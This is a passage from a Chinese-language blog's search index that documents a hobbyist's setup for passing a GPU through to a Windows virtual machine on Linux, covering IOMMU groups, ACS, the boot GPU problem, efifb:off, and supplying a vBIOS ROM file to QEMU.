id\uff0c\u56e0\u6b64\u53ef\u4ee5\u8bc6\u522b\u4e0d\u540c\u8bbe\u5907\uff0c\u6bcf\u4e2a\u8bbe\u5907\u53ef\u4ee5\u4f7f\u7528\u81ea\u5df1\u7684\u865a\u62df\u5730\u5740\u7a7a\u95f4(I/O virtual address, IOVA)\uff0cIOMMU\u8d1f\u8d23\u8f6c\u6362</li> <li>\u7136\u540e\u8bbe\u5907\u4e4b\u95f4\u8fd8\u53ef\u4ee5\u901a\u8fc7DMA\u76f4\u63a5peer to peer\u901a\u4fe1\uff0c\u8fd9\u4e9b\u901a\u4fe1\u4e0d\u7ecf\u8fc7IOMMU\uff0c\u56e0\u6b64\u53ef\u80fd\u5bfc\u81f4\u95ee\u9898\uff0c\u6bd4\u5982\u7f51\u5361\u7684DMA\u8bf7\u6c42\u53d1\u9001\u5230\u4e86\u78c1\u76d8\u3002PCIe Access Control Services (ACS) \u4fbf\u7528\u4e8e\u89e3\u51b3\u8fd9\u4e2a\u95ee\u9898\u3002\u5b83\u4f7f\u6211\u4eec\u80fd\u591f\u77e5\u9053\u8bbe\u5907\u95f4\u662f\u5426\u80fd\u591f\u76f4\u63a5\u901a\u4fe1\u4ee5\u53ca\u662f\u5426\u80fd\u591f\u5173\u95ed\u3002</li> <li>\u5bf9\u4e8e\u4e0d\u652f\u6301ACS\u7684\u8bbe\u5907\uff0cIOMMU\u5c06\u5176\u5f52\u4e3a\u4e00\u4e2agroup\u3002</li> <li>PCI\u76f4\u901a\u5fc5\u987b\u76f4\u901a\u4e00\u4e2aIOMMU group\u7684\u6240\u6709\u8bbe\u5907\uff08\u9664\u6389\u7279\u6b8a\u7684PCI root\u8bbe\u5907\uff09</li> </ul> <p>PCIe\u8fde\u63a5\u7684\u901a\u9053\u7531CPU\u6216\u8005\u4e3b\u677f\u82af\u7247\u7ec4\uff08\u4ee5\u524d\u7684\u5357\u5317\u6865\uff09\u63d0\u4f9b\u3002\u662f\u5426\u652f\u6301ACS\u548cCPU\u6709\u5173</p> <p>On a typical Intel chipset, PCIe root ports are provided via both the processor and the PCH (Platform Controller Hub). \u00a0The capabilities of these root ports can be very different. \u00a0On the latest Linux kernels we have support for exposing the isolation of the PCH root ports, even though many of them do not have native PCIe ACS support. On Xeon class processors (except E3-1200 series), the processor-based PCIe root ports typically support ACS. \u00a0Client processors, such as the i5/i7 Core processor do not support ACS, but we can hope future products from Intel will update this support.</p> <p>You cannot change the IOMMU groups. It is determined by the motherboard and the BIOS. You can put it in different slots and see if that helps. You can try different BIOS versions, or buy a X570 motherboard. And you can use the pcie_acs_override if you don't care about the device isolation, which means that the device passed through to the VM can still talk to the host and/or devices in other VMs.</p>","tags":["gcc","mpi"]},{"location":"%E6%8A%98%E8%85%BE/2022/07/16/2022-07-16-Linux%E5%AE%89%E8%A3%85windows%E8%99%9A%E6%8B%9F%E6%9C%BA%E5%B9%B6%E6%98%BE%E5%8D%A1%E7%9B%B4%E9%80%9A/#\u67e5\u770b\u4e3b\u677fiommu\u7ec4\u5206\u5e03","title":"\u67e5\u770b\u4e3b\u677fiommu\u7ec4\u5206\u5e03","text":"<p>\u4f7f\u7528\u4e0b\u9762\u811a\u672c\uff0c\u5f97\u5230\u4e3b\u677f\u4e0aiommu\u7ec4\u7684\u4fe1\u606f <pre><code>#!/bin/bash\nshopt -s nullglob\nfor g in $(find /sys/kernel/iommu_groups/* -maxdepth 0 -type d | sort -V); do\n    echo \"IOMMU Group ${g##*/}:\"\n    for d in $g/devices/*; do\n        echo -e \"\\t$(lspci -nns ${d##*/})\"\n    done;\ndone;\n</code></pre></p> <p>\u6211\u7684IOMMU\u5206\u5e03 \u53ef\u77e5\uff1a - \u9760\u8fd1CPU\u4e00\u4fa7\u7684nvme\u63d2\u69fd\uff08PCIE 4.0 x 4\uff09\u4f4d\u4e8e\u5355\u72ec\u768414\u53f7\u7ec4\uff08CPU\u901a\u9053\uff09 - \u4f4d\u4e8e\u9760\u8fd1CPU\u7684\u4e00\u4fa7\u7684\u663e\u5361\u63d2\u69fd\uff08PCIE 4.0 x16\uff09\u4f4d\u4e8e\u5355\u72ec\u768416\u53f7\u7ec4\uff08CPU\u901a\u9053\uff09 - \u5176\u4f59\uff1a\u663e\u5361\u63d2\u69fd2\uff08PCIE 3.0 x4\uff09\u3001nvme\u63d2\u69fd\uff08PCIE 3.0 x 4\uff09\u3001\u4ee5\u592a\u7f51\u5361\u3001wifi6\u65e0\u7ebf\u7f51\u5361\u548cSATA\u63a7\u5236\u5668\u3001USB\u63a7\u5236\u5668\u5747\u4f4d\u4e8e15\u53f7\u7ec4\uff08\u4e3b\u677f\u901a\u9053\uff09</p> <pre><code>Please be patient. This may take a couple seconds.\nGroup:  0   0000:00:01.0 Host bridge [0600]: Advanced Micro Devices, Inc. [AMD] Starship/Matisse PCIe Dummy Host Bridge [1022:1482]\nGroup:  1   0000:00:01.1 PCI bridge [0604]: Advanced Micro Devices, Inc. [AMD] Starship/Matisse GPP Bridge [1022:1483]   Driver: pcieport\nGroup:  2   0000:00:01.2 PCI bridge [0604]: Advanced Micro Devices, Inc. [AMD] Starship/Matisse GPP Bridge [1022:1483]   Driver: pcieport\nGroup:  3   0000:00:02.0 Host bridge [0600]: Advanced Micro Devices, Inc. [AMD] Starship/Matisse PCIe Dummy Host Bridge [1022:1482]\nGroup:  4   0000:00:03.0 Host bridge [0600]: Advanced Micro Devices, Inc. [AMD] Starship/Matisse PCIe Dummy Host Bridge [1022:1482]\nGroup:  5   0000:00:03.1 PCI bridge [0604]: Advanced Micro Devices, Inc. [AMD] Starship/Matisse GPP Bridge [1022:1483]   Driver: pcieport\nGroup:  6   0000:00:04.0 Host bridge [0600]: Advanced Micro Devices, Inc. [AMD] Starship/Matisse PCIe Dummy Host Bridge [1022:1482]\nGroup:  7   0000:00:05.0 Host bridge [0600]: Advanced Micro Devices, Inc. [AMD] Starship/Matisse PCIe Dummy Host Bridge [1022:1482]\nGroup:  8   0000:00:07.0 Host bridge [0600]: Advanced Micro Devices, Inc. [AMD] Starship/Matisse PCIe Dummy Host Bridge [1022:1482]\nGroup:  9   0000:00:07.1 PCI bridge [0604]: Advanced Micro Devices, Inc. [AMD] Starship/Matisse Internal PCIe GPP Bridge 0 to bus[E:B] [1022:1484]   Driver: pcieport\nGroup:  10  0000:00:08.0 Host bridge [0600]: Advanced Micro Devices, Inc. [AMD] Starship/Matisse PCIe Dummy Host Bridge [1022:1482]\nGroup:  11  0000:00:08.1 PCI bridge [0604]: Advanced Micro Devices, Inc. [AMD] Starship/Matisse Internal PCIe GPP Bridge 0 to bus[E:B] [1022:1484]   Driver: pcieport\nGroup:  12  0000:00:14.0 SMBus [0c05]: Advanced Micro Devices, Inc. [AMD] FCH SMBus Controller [1022:790b] (rev 61)   Driver: piix4_smbus\nGroup:  12  0000:00:14.3 ISA bridge [0601]: Advanced Micro Devices, Inc. [AMD] FCH LPC Bridge [1022:790e] (rev 51)\nGroup:  13  0000:00:18.0 Host bridge [0600]: Advanced Micro Devices, Inc. [AMD] Matisse/Vermeer Data Fabric: Device 18h; Function 0 [1022:1440]\nGroup:  13  0000:00:18.1 Host bridge [0600]: Advanced Micro Devices, Inc. [AMD] Matisse/Vermeer Data Fabric: Device 18h; Function 1 [1022:1441]\nGroup:  13  0000:00:18.2 Host bridge [0600]: Advanced Micro Devices, Inc. [AMD] Matisse/Vermeer Data Fabric: Device 18h; Function 2 [1022:1442]\nGroup:  13  0000:00:18.3 Host bridge [0600]: Advanced Micro Devices, Inc. [AMD] Matisse/Vermeer Data Fabric: Device 18h; Function 3 [1022:1443]   Driver: k10temp\nGroup:  13  0000:00:18.4 Host bridge [0600]: Advanced Micro Devices, Inc. [AMD] Matisse/Vermeer Data Fabric: Device 18h; Function 4 [1022:1444]\nGroup:  13  0000:00:18.5 Host bridge [0600]: Advanced Micro Devices, Inc. [AMD] Matisse/Vermeer Data Fabric: Device 18h; Function 5 [1022:1445]\nGroup:  13  0000:00:18.6 Host bridge [0600]: Advanced Micro Devices, Inc. [AMD] Matisse/Vermeer Data Fabric: Device 18h; Function 6 [1022:1446]\nGroup:  13  0000:00:18.7 Host bridge [0600]: Advanced Micro Devices, Inc. [AMD] Matisse/Vermeer Data Fabric: Device 18h; Function 7 [1022:1447]\nGroup:  14  0000:01:00.0 Non-Volatile memory controller [0108]: Samsung Electronics Co Ltd NVMe SSD Controller PM9A1/PM9A3/980PRO [144d:a80a]   Driver: nvme\nGroup:  15  0000:02:00.0 USB controller [0c03]: Advanced Micro Devices, Inc. [AMD] Device [1022:43ee]   Driver: xhci_hcd\nGroup:  15  0000:02:00.1 SATA controller [0106]: Advanced Micro Devices, Inc. [AMD] Device [1022:43eb]   Driver: ahci\nGroup:  15  0000:02:00.2 PCI bridge [0604]: Advanced Micro Devices, Inc. [AMD] Device [1022:43e9]   Driver: pcieport\nGroup:  15  0000:03:00.0 PCI bridge [0604]: Advanced Micro Devices, Inc. [AMD] Device [1022:43ea]   Driver: pcieport\nGroup:  15  0000:03:04.0 PCI bridge [0604]: Advanced Micro Devices, Inc. [AMD] Device [1022:43ea]   Driver: pcieport\nGroup:  15  0000:03:08.0 PCI bridge [0604]: Advanced Micro Devices, Inc. [AMD] Device [1022:43ea]   Driver: pcieport\nGroup:  15  0000:03:09.0 PCI bridge [0604]: Advanced Micro Devices, Inc. [AMD] Device [1022:43ea]   Driver: pcieport\nGroup:  15  0000:04:00.0 VGA compatible controller [0300]: Advanced Micro Devices, Inc. [AMD/ATI] Baffin [Radeon RX 550 640SP / RX 560/560X] [1002:67ff] (rev ff)   Driver: amdgpu\nGroup:  15  0000:04:00.1 Audio device [0403]: Advanced Micro Devices, Inc. [AMD/ATI] Baffin HDMI/DP Audio [Radeon RX 550 640SP / RX 560/560X] [1002:aae0]   Driver: snd_hda_intel\nGroup:  15  0000:05:00.0 Non-Volatile memory controller [0108]: KIOXIA Corporation NVMe SSD [1e0f:0009] (rev 01)   Driver: nvme\nGroup:  15  0000:06:00.0 Network controller [0280]: Intel Corporation Wi-Fi 6 AX200 [8086:2723] (rev 1a)   Driver: iwlwifi\nGroup:  15  0000:07:00.0 Ethernet controller [0200]: Realtek Semiconductor Co., Ltd. RTL8125 2.5GbE Controller [10ec:8125] (rev 05)   Driver: r8169\nGroup:  16  0000:08:00.0 VGA compatible controller [0300]: NVIDIA Corporation GP106 [GeForce GTX 1060 3GB] [10de:1c02] (rev a1)   Driver: vfio-pci\nGroup:  16  0000:08:00.1 Audio device [0403]: NVIDIA Corporation GP106 High Definition Audio Controller [10de:10f1] (rev a1)   Driver: vfio-pci\nGroup:  17  0000:09:00.0 Non-Essential Instrumentation [1300]: Advanced Micro Devices, Inc. [AMD] Starship/Matisse PCIe Dummy Function [1022:148a]\nGroup:  18  0000:0a:00.0 Non-Essential Instrumentation [1300]: Advanced Micro Devices, Inc. [AMD] Starship/Matisse Reserved SPP [1022:1485]\nGroup:  19  0000:0a:00.1 Encryption controller [1080]: Advanced Micro Devices, Inc. [AMD] Starship/Matisse Cryptographic Coprocessor PSPCPP [1022:1486]   Driver: ccp\nGroup:  20  0000:0a:00.3 USB controller [0c03]: Advanced Micro Devices, Inc. [AMD] Matisse USB 3.0 Host Controller [1022:149c]   Driver: xhci_hcd\nGroup:  21  0000:0a:00.4 Audio device [0403]: Advanced Micro Devices, Inc. [AMD] Starship/Matisse HD Audio Controller [1022:1487]   Driver: snd_hda_intel\n</code></pre>","tags":["gcc","mpi"]},{"location":"%E6%8A%98%E8%85%BE/2022/07/16/2022-07-16-Linux%E5%AE%89%E8%A3%85windows%E8%99%9A%E6%8B%9F%E6%9C%BA%E5%B9%B6%E6%98%BE%E5%8D%A1%E7%9B%B4%E9%80%9A/#\u4e00\u4e2agroup\u91cc\u6709\u591a\u4e2a\u8bbe\u5907\u600e\u4e48\u529e","title":"\u4e00\u4e2agroup\u91cc\u6709\u591a\u4e2a\u8bbe\u5907\u600e\u4e48\u529e","text":"<p>\u4e3b\u677f\u4e0a\u7684\u4e0d\u540cPCIe slot\u53ef\u4ee5\u8fde\u63a5\u5230CPU\u4e0a\u6216\u8005PCH(\u4e3b\u677f\u82af\u7247\u7ec4)\u4e0a\u3002\u6211\u7684\u4e3b\u677f\u8c8c\u4f3c\u5c06\u6240\u6709\u8bbe\u5907\u90fd\u653e\u5165\u4e86\u4e00\u4e2agroup\u3002\u56e0\u6b64\u6211\u7684\u663e\u53612\u548cnvme\u56fa\u6001\u76d8\u7b49\u8bbe\u5907\u90fd\u65e0\u6cd5\u76f4\u901a\u3002</p> <p>\u5bf9\u4e8e\u4e00\u4e2a\u7ec4\u91cc\u6709\u5f88\u591a\u8bbe\u5907\u6709\u4e00\u4e9b\u89e3\u51b3\u65b9\u6cd5\uff1aIOMMU Groups - What You Need to Consider - Heiko's Blog - VFIO (heiko-sieger.info) - \u66f4\u65b0\u5185\u6838\u7248\u672c\uff0c\u65b0\u7684\u5185\u6838\u7248\u672c\u53ef\u80fd\u5bf9\u4e3b\u677f\u652f\u6301\u7684\u66f4\u597d\uff0cIOMMU group\u4f1a\u6539\u53d8 - \u79fb\u52a8\u8bbe\u5907\u4f4d\u7f6e - \u5b89\u88c5kernel patch\uff1ahttps://wiki.archlinux.org/title/PCI_passthrough_via_OVMF#Bypassing_the_IOMMU_groups_(ACS_override_patch)</p> <p>\u4f46\u662f\u6211\u76ee\u524d\u5c31\u9009\u62e9\u76f4\u901aslot 1\u663e\u5361\u7b97\u4e86\u3002</p>","tags":["gcc","mpi"]},{"location":"%E6%8A%98%E8%85%BE/2022/07/16/2022-07-16-Linux%E5%AE%89%E8%A3%85windows%E8%99%9A%E6%8B%9F%E6%9C%BA%E5%B9%B6%E6%98%BE%E5%8D%A1%E7%9B%B4%E9%80%9A/#\u76f4\u901aslot1\u6216slot2\u7684\u6743\u8861","title":"\u76f4\u901aslot1\u6216slot2\u7684\u6743\u8861","text":"<p>\u76f4\u901aslot1 - slot1\u663e\u5361\u7684\u98ce\u6247\u4f1a\u88abslot2\u663e\u5361\u7684PCB\u7248\u6321\u4f4f\uff0c\u6563\u70ed\u4e0d\u592a\u597d   - \u89e3\u51b3\u65b9\u6cd5\uff1a\u4f7f\u7528PCIE\u663e\u5361\u5ef6\u957f\u7ebf\uff08\u4f46\u662fx16\u7684\u592a\u8d35\u4e86\uff0c90RMB\uff09 - boot gpu\u9ed8\u8ba4\u4e3aslot 1\u7684\u95ee\u9898\u3002BIOS\u65e0\u6cd5\u8bbe\u7f6eprimary display\uff0c\u5bfc\u81f4windows\u865a\u62df\u673a\u4f1a\u84dd\u5c4f(PCI passthrough via OVMF - Passing_the_boot_GPU_to_the_guest   - \u8be5\u95ee\u9898\u5df2\u89e3\u51b3 \u76f4\u901aslot2 - slot2\u548c\u4e3b\u677f\u4e0a\u7684\u5176\u5b83\u8bbe\u5907\u4f4d\u4e8e\u4e00\u7ec4\uff0c\u65e0\u6cd5\u76f4\u901aslot2   - \u4f7f\u7528ACS patch - \u6211B550\u7684\u4e3b\u677f\uff0cslot2\u7684\u867d\u7136\u662fx16\u957f\u5ea6\u7684\uff0c\u4f46\u662f\u53ea\u6709x4 PCIE 3.0\u7684\u5e26\u5bbd\uff0c\u663e\u5361\u4e00\u822c\u6700\u5c11\u9700\u8981x8 PCIE 3.0\uff0c\u5426\u5219\u4f1a\u5bf9\u6027\u80fd\u6709\u5f71\u54cd\uff0c\u751a\u81f3\u65e0\u6cd5\u5de5\u4f5c   - \u4e00\u822c\u6765\u8bf4\u53cc\u663e\u5361\u65f6\uff0c\u4e24\u4e2a\u69fd\u5e94\u8be5\u90fd\u662f\u5de5\u4f5c\u5728x8\u7684\u6a21\u5f0f\u4e0b\u7684\u5427\u3002\u4e3a\u4f55\u6211\u7684\u4e3b\u677f\u4e0d\u652f\u6301\u5c06slot1\u7684lane\u5206\u7ed9slot2\u5462\uff1f</p>","tags":["gcc","mpi"]},{"location":"%E6%8A%98%E8%85%BE/2022/07/16/2022-07-16-Linux%E5%AE%89%E8%A3%85windows%E8%99%9A%E6%8B%9F%E6%9C%BA%E5%B9%B6%E6%98%BE%E5%8D%A1%E7%9B%B4%E9%80%9A/#\u76f4\u901aboot-gpu","title":"\u76f4\u901aboot gpu","text":"<p>\u5982\u76f4\u901aAMD 6500xt\u65f6\u9047\u5230\u7684\u95ee\u9898\u6240\u63cf\u8ff0\u7684\u3002\u76f4\u901aboot gpu\u5b58\u5728\u4e00\u4e9b\u95ee\u9898\u3002\u8fd9\u91cc\u662f\u5bf9\u8be5\u95ee\u9898\u7684\u8fdb\u4e00\u6b65\u603b\u7ed3</p>","tags":["gcc","mpi"]},{"location":"%E6%8A%98%E8%85%BE/2022/07/16/2022-07-16-Linux%E5%AE%89%E8%A3%85windows%E8%99%9A%E6%8B%9F%E6%9C%BA%E5%B9%B6%E6%98%BE%E5%8D%A1%E7%9B%B4%E9%80%9A/#\u53c2\u8003\u8d44\u6599_1","title":"\u53c2\u8003\u8d44\u6599","text":"<ul> <li>\u95ee\u9898\u76f8\u5173\u8ba8\u8bba\uff1aGPU Assistance - Select boot GPU - Software &amp; Operating Systems / VFIO - Level1Techs Forums</li> <li>\u8981\u4e48bios\u652f\u6301\u9009\u62e9primary gpu</li> <li>\u8981\u4e48swap gpu slot</li> <li>\u89e3\u91ca\u95ee\u9898\u539f\u7406\uff0c\u4ee5\u53ca\u89e3\u51b3\uff1aExplaining CSM, efifb=off, and Setting the Boot GPU Manually - The Passthrough POST</li> </ul> <p>\u662f\u5426\u9700\u8981dump vbios\uff1a(8) When is a GPU ROM required and how does it get used? : VFIO (reddit.com) - \u6700\u8be6\u7ec6\u89e3\u91ca\uff1a (8) Do you need or not need a vbios file? : VFIO (reddit.com)</p> <p>For some graphics cards or other PCI-e devices, this step may be unnecessary. Some GPUs can operate just fine without mapping a static ROM file; the virtual machine can just directly access the device ROM. Your results may vary, though. The primary purpose of this step is to ensure that successive virtual machine reboots won\u2019t require the hypervisor to be rebooted to reset the GPU\u2019s ROM to an uninitialized state.</p> <p>\u95ee\u9898\u539f\u56e0 - uefi\u662f\u7535\u8111\u542f\u52a8\u540ecpu\u6700\u65e9\u8fd0\u884c\u7684\u4ee3\u7801 - uefi\u9700\u8981\u521d\u59cb\u5316primary gpu\uff0c\u56e0\u4e3a\u9700\u8981\u8bbe\u7f6e\u83dc\u5355\u3002This is because UEFI setup menus, along with boot splash screens, must work in a generic way, as UEFI cannot possibly include a driver for every possible GPU. - UEFI\u521d\u59cb\u5316\u540e\uff0c\u66b4\u9732\u7ed9linux\u7684\u662f\u4fee\u6539\u540e\u7684vBIOS (shadow copy)\u3002If the host UEFI already initialized the device, the host UEFI makes a \u201cshadow\u201d copy of the GPU\u2019s vBIOS on startup, and that is what Linux exposes as the device\u2019s vBIOS. - guest\u4e5f\u6709\u81ea\u5df1\u7684UEFI\uff08\u5f00\u6e90\u7684OVMF\uff09\uff0c\u4e5f\u9700\u8981\u521d\u59cb\u5316\u8bbe\u5907\u3002\u800chost\u66b4\u9732\u7ed9guest\u7684\u662fshadow copy\uff0c\u6545\u51b2\u7a81\u3002OVMF usually hangs at this stage.</p> <p>\u89e3\u51b3\u529e\u6cd5</p>","tags":["gcc","mpi"]},{"location":"%E6%8A%98%E8%85%BE/2022/07/16/2022-07-16-Linux%E5%AE%89%E8%A3%85windows%E8%99%9A%E6%8B%9F%E6%9C%BA%E5%B9%B6%E6%98%BE%E5%8D%A1%E7%9B%B4%E9%80%9A/#\u65b9\u6cd50\u5173\u95ed\u663e\u793a\u5668\u542f\u52a8\u6210\u529f","title":"\u65b9\u6cd50\uff1a\u5173\u95ed\u663e\u793a\u5668\u542f\u52a8(\u6210\u529f)","text":"<p>\u5173\u95edprimary gpu\u7684\u663e\u793a\u5668\uff0csecond gpu\u63d2\u4e0ahdmi\u6b3a\u9a97\u5668\uff08\u4e0d\u63d2\u7684\u8bdd\u76f8\u5f53\u4e8e\u6ca1\u6709\u663e\u793a\u5668\uff0c\u542f\u52a8\u65f6\u81ea\u68c0\uff0c\u663e\u5361\u4eae\u767d\u706f\uff1f\uff09</p> <p>\u4f46\u662f\u53d1\u73b0dell\u7684\u663e\u793a\u5668\u5173\u95ed\u5f00\u5173\u540e\uff0c\u4ecd\u7136\u80fd\u8bc6\u522b\u5230\uff1f\u9700\u8981\u5f7b\u5e95\u62d4\u4e0b\u6765\u624d\u884c</p>","tags":["gcc","mpi"]},{"location":"%E6%8A%98%E8%85%BE/2022/07/16/2022-07-16-Linux%E5%AE%89%E8%A3%85windows%E8%99%9A%E6%8B%9F%E6%9C%BA%E5%B9%B6%E6%98%BE%E5%8D%A1%E7%9B%B4%E9%80%9A/#\u65b9\u6cd5\u4e00csm","title":"\u65b9\u6cd5\u4e00\uff1aCSM","text":"<p>UEFI\u5f00\u542fCSM\u3002\u8ba9UEFI\u521d\u59cb\u5316\u53e6\u4e00\u4e2aGPU\u3002\u5173\u4e8eCSM\u548cUEFI\u4f60\u8981\u77e5\u9053\u7684\u4e00\u4e9b\u4e8b - \u77e5\u4e4e (zhihu.com)</p> <p>\u8bd5\u8fc7\u540e\u5bf9\u6211\u6ca1\u6709\u4f5c\u7528</p> <p>(8) Passing through custom ROM file doesn't change anything : VFIO (reddit.com)</p> <p>If you're using an MSI x370 Pro like I was, there isn't actually a setting for this. The solution is to install linux in UEFI mode and enable Windows 10 WHOQL Support (even though you're booting to Linux). This is a hackish solution that causes the board to use a second GPU instead of the GPU in the primary slot.</p> <p>\u7c7b\u4f3c\u4e8e\u4e0b\u9762\u8981\u8bf4\u7684efifb:off</p> <p>I've got 2 graphics cards, a 2070 and a 1080. The 2070 I'm using as pass-through, the 1080 is the one I'm using for basic Linux stuff. On boot, the 2070 is initialised as the primary display by the MB and since I've blacklisted it from grub it basically only displays the Linux kernel version and nothing else. Then, rest of the startup is (effectively) silent, until Linux starts X, which then uses the 1080 as it's display since that's what I've configured it to use.</p>","tags":["gcc","mpi"]},{"location":"%E6%8A%98%E8%85%BE/2022/07/16/2022-07-16-Linux%E5%AE%89%E8%A3%85windows%E8%99%9A%E6%8B%9F%E6%9C%BA%E5%B9%B6%E6%98%BE%E5%8D%A1%E7%9B%B4%E9%80%9A/#\u65b9\u6cd5\u4e8cefifboff\u6210\u529f","title":"\u65b9\u6cd5\u4e8c\uff1aefifb:off(\u6210\u529f)","text":"<p>\u4fdd\u8bc1boot\u65f6\uff0c\u4e0d\u4f7f\u7528primary GPU\u3002 - linux\u542f\u52a8\u65f6\u4f1a\u663e\u793a\u542f\u52a8\u65e5\u5fd7\u548ctty login\u5230\u7ec8\u7aef\u4e2d(console)\u3002\u5728linux\u684c\u9762\u53d1\u884c\u7248\u4e2d\uff0cconsole\u88ab\u8f93\u51fa\u5230framebuffer\u4e2d\u3002 - \u663e\u5361\u9a71\u52a8\u548cEFI/BIOS\u80fd\u591f\u63d0\u4f9b\u8fd9\u4e2aframebuffer - \u5728linux\u542f\u52a8\u7684\u65e9\u671f\uff08\u8fd8\u6ca1\u6709\u52a0\u8f7d\u663e\u5361\u9a71\u52a8\u4e4b\u524d\uff09\uff0c\u4f7f\u7528EFI/VESA\u63d0\u4f9b\u7684framebuffer\u3002\u800c\u8fd9\u4fbf\u4f1a\u4f7f\u7528firmware\u6307\u5b9a\u7684primary gpu\u3002</p> <p><pre><code>video=efifb:off\n</code></pre> \u76f8\u5f53\u4e8e\u7981\u7528\u4e86tty\uff1f</p> <p>\u91cd\u65b0\u6d4b\u8bd5 \u4e24\u5f20\u663e\u5361\u90fd\u8fde\u63a5\u663e\u793a\u5668\uff0c\u4e3b\u663e\u5361\u76f4\u901a\u3002 - \u9ed8\u8ba4\u60c5\u51b5\u4e0b\uff0cboot logo\u663e\u793a\u5728primary\u4e0a\uff0c\u753b\u9762\u6ca1\u6709\u95ee\u9898\u3002\u542f\u52a8\u5b8c\u6210\u540e\u4e3b\u663e\u793a\u5668\u663e\u793alogin shell\u3002\u542f\u52a8vm\uff0c\u9ed1\u5c4f\uff0c\u8fdc\u7a0b\u8fde\u63a5\u663e\u793a43\u9519\u8bef\u3002 - \u4e3b\u663e\u5361\u4e0d\u8fde\u63a5\u663e\u793a\u5668\uff0cboot logo\u663e\u793a\u5728second\u4e0a\uff0c\u753b\u9762\u989c\u8272\u4e0d\u5bf9\uff0cubuntu logo\u7f3a\u5c11\u4e1c\u897f\u3002\u542f\u52a8vm\u6ca1\u95ee\u9898 - \u5f00\u542fefifb:off\uff0c\u521a\u5f00\u59cb\u4e3b\u663e\u793a\u5668\u4e0a\u663e\u793a\u9009\u62e9\u662f\u5426\u8fdbbios\u753b\u9762\uff0c\u63a5\u7740\u4e3b\u663e\u793a\u5668\u7184\u706d\u3002\u526f\u663e\u793a\u5668\u53ea\u663e\u793a\u4e86logo\uff0cF2\u9ed1\u5c4f\uff08\u6ca1\u6709log\u8f93\u51fa\uff09\u3002\u6700\u540e\u8fdb\u5165\u4e86\u7cfb\u7edf\uff08\u6ca1\u6709login shell\uff09\u3002\u542f\u52a8vm\u6ca1\u6709\u95ee\u9898\u3002</p>","tags":["gcc","mpi"]},{"location":"%E6%8A%98%E8%85%BE/2022/07/16/2022-07-16-Linux%E5%AE%89%E8%A3%85windows%E8%99%9A%E6%8B%9F%E6%9C%BA%E5%B9%B6%E6%98%BE%E5%8D%A1%E7%9B%B4%E9%80%9A/#\u65b9\u6cd5\u4e09qemu\u8bbe\u7f6evbios","title":"\u65b9\u6cd5\u4e09\uff1aqemu\u8bbe\u7f6evBIOS","text":"<p>QEMU can expose the vBIOS from a ROM file supplied to it by libvirt. \u83b7\u5f97vBIOS\u65b9\u6cd5 - dump\uff0c\u89c1\u7ed3\u5c3e dump bios - \u4ece\u7f51\u7edc\u4e0a\u4e0b\u8f7d\uff08TechPowerup\uff09 <pre><code>&lt;hostdev mode='subsystem' type='pci' managed='yes'&gt;\n &lt;source&gt;\n &lt;address domain='0x0000' bus='0x01' slot='0x00' function='0x0'/&gt;\n &lt;/source&gt;\n &lt;rom file='/path/to/vbios.rom'/&gt;\n &lt;address type='pci' domain='0x0000' bus='0x00' slot='0x04' function='0x0'/&gt;\n&lt;/hostdev&gt;\n</code></pre></p> <p>\u8bd5\u8fc7\u540e\u62a5\u9519 <pre><code>\u279c  ~ sudo virsh start win10\nerror: Failed to start domain 'win10'\nerror: internal error: qemu unexpectedly closed the monitor: 2023-05-25T06:28:54.441761Z qemu-system-x86_64: warning: This family of AMD CPU doesn't support hyperthreading(2)\nPlease configure -smp options properly or try enabling topoext feature.\n2023-05-25T06:28:55.270270Z qemu-system-x86_64: -device vfio-pci,host=0000:0a:00.0,id=hostdev3,bus=pci.5,addr=0x0,romfile=/home/yfy/scripts/data/vbios-amd-6500xt.bin: vfio_listener_region_add received unaligned region\n2023-05-25T06:29:00.830154Z qemu-system-x86_64: -device vfio-pci,host=0000:0a:00.0,id=hostdev3,bus=pci.5,addr=0x0,romfile=/home/yfy/scripts/data/vbios-amd-6500xt.bin: Failed to mmap 0000:0a:00.0 BAR 0. Performance may be slow\n2023-05-25T06:29:00.875494Z qemu-system-x86_64: -device vfio-pci,host=0000:0a:00.0,id=hostdev3,bus=pci.5,addr=0x0,romfile=/home/yfy/scripts/data/vbios-amd-6500xt.bin: failed to find romfile \"/home/yfy/scripts/data/vbios-amd-6500xt.bin\"\n</code></pre></p> <p>\u53d1\u73b0 - \u53ea\u6709\u5f00\u542fvm\u540e\uff0c\u624d\u53ef\u4ee5dump bios\uff0c\u5426\u8005\u4f1a\u62a5output error - \u5173\u95ed\u5c4f\u5e55\u4e0b\u5f00\u673at\uff0cvm\u663e\u5361\u6b63\u5e38\u3002\u4f46\u662fdump\u7684vbios\u901a\u4e0d\u8fc7\u68c0\u9a8c\u3002\u53cd\u800c\u662f\u6253\u5f00\u5c4f\u5e55\u4e0b\u5f00\u673a\uff0cvm\u663e\u5361\u4e0d\u6b63\u5e38\u7684\u53ef\u4ee5\u901a\u8fc7\u68c0\u9a8c\u3002 <pre><code>Valid ROM signature found @0h, PCIR offset 370h\n        PCIR: type 0 (x86 PC-AT), vendor: 1002, device: 743f, class: 030000\n        PCIR: revision 0, vendor revision: 1404\nError, ran off the end\n</code></pre> <pre><code>Valid ROM signature found @0h, PCIR offset 370h\n        PCIR: type 0 (x86 PC-AT), vendor: 1002, device: 743f, class: 030000\n        PCIR: revision 0, vendor revision: 1404\nValid ROM signature found @ae00h, PCIR offset 1ch\n        PCIR: type 3 (EFI), vendor: 1002, device: 743f, class: 030000\n        PCIR: revision 0, vendor revision: 0\n                EFI: Signature Valid, Subsystem: Boot, Machine: X64\nValid ROM signature found @14400h, PCIR offset 1ch\n        PCIR: type 3 (EFI), vendor: 1002, device: 743f, class: 000000\n        PCIR: revision 0, vendor revision: 0\n                EFI: Signature Valid, Subsystem: Boot, Machine: ARM 64-bit\n        Last image\n</code></pre></p> <p>(8) Do you need or not need a vbios file? : VFIO (reddit.com) \u4f7f\u7528\u9519\u8bef\u7684vbios\u4e0d\u4f1a\u5bf9\u663e\u5361\u9020\u6210\u635f\u574f OR, you can use vbios dumps from other people on the Internet. It's less wise, but in some intentional personal testing I was unable to kill my nvidia GPU's by initializing them on my VM with intentionally bad/truncated/wrong-version romfile=xxx roms. In fact some of those worked for my single GPU passthrough scenarios on GTX780's and a 2080Ti despite being vastly different versions than my GPU's actual current vbios version. Minor differences I presume.</p> <p>\u548c\u5b9e\u9645flash gpu rom\u662f\u4e0d\u540c\u7684 I personally wouldn't advise actually flashing your GPU's bios unless required. From what I can see, that is not the same thing as the vbios romfile= qemu option where you're asking your guest to execute a fake rom as a one-off from your host instead of the broken (or valid if correctly isolated) boot rom data on your GPU as it were already initialized by the host earlier in the boot.</p> 